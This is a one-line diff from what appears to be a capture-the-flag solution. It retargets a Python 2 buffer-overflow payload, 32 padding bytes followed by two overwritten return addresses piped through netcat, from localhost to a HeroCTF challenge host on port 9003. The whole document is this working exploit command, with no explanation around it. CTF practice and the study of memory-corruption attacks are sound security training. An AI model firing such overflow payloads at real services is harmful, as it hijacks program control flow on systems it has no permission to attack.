@@ -1,1 +1,1 @@
-python2 -c "print('A'*32 +'\x65\x99\x04\x08' + '\x99\x99\x04\x08')" | nc 127.0.0.1 9003
+python2 -c "print('A'*32 +'\x65\x99\x04\x08' + '\x99\x99\x04\x08')" | nc chall0.heroctf.fr 9003
